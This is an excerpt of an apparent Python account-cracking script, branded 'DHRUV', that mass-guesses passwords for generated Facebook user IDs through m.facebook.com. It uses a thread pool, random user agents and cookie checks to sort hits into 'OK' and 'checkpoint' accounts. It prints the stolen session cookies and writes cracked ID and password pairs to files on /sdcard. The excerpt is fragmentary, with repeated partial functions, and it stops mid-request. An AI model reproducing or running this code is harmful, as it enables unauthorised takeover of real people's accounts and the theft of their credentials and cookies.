...
def Ind():
	os.system('clear')
	print(logo)
	print('[1] Method [\x1b[1;92mApk Method\x1b[1;97m] ')
	print('[2] Method [\x1b[1;92mSimple Method\x1b[1;97m] ')
	#print('[3] Method [\x1b[1;92m\x1b[1;97m] ')
...
def method1():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('\033[1;37;1m[+] CRACKING START...(\033[1;37mIndia)');print(47*"=");print(47*"=")
		for guru in user:
			uid = kode+guru
			pwx = [kode, kode+guru]
...
def mcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			sys.stdout.write('\r [\033[1;92mIDHRUV [%s/%s] [OK:-%s ] [\033[1;91mCP:-\033[1;91m%s] \r'%(loop,tl,len(oks),len(cps))),
			sys.stdout.flush()
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[DHRUV-OK] '+cid+' | '+ps+'\033[1;32m')
...
def mcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write('\r [\033[1;92mIDHRUV] [%s/%s] [\033[1;92mOK:-\033[1;92m%s]  \r'%(loop,tl,len(oks))),
			sys.stdout.flush()
			ua = random.choice(syed)
...
def mbcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write('\r [\033[1;92mDHRUV] [%s/%s] [\033[1;92mOK:-\033[1;92m%s]  \r'%(loop,tl,len(oks))),
			sys.stdout.flush()
			ua = random.choice(syed)
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[1;92m[DHRUV-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in DHRUV_xd:
					print("\33[1;92m[🎀] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/DHRUV-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[DHRUV-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/DHRUV-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/DHRUV-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[DHRUV] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write('\r [DHRUV] [%s/%s] [OK:-%s]  \r'%(loop,tl,len(oks))),
			sys.stdout.flush()
			ua = random.choice(syed)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
